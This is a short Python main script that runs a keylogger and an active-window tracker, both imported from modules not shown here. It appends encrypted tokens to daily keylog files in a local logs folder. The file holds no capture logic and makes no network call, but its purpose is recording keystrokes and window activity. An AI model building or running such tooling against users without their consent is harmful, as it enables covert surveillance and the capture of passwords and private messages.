import os
from datetime import datetime
from .keylogger import start_keylogger
from .activitytracker import log_active_window

LOG_DIR = "logs"
os.makedirs(LOG_DIR, exist_ok=True)

def log_callback(token: bytes):
    date_str = datetime.now().strftime("%Y-%m-%d")
    path = os.path.join(LOG_DIR, f"keylog-{date_str}.txt.enc")
    with open(path, "ab") as f:
        f.write(token + b"\n")

if __name__ == "__main__":
    start_keylogger(log_callback)
    log_active_window(log_callback)
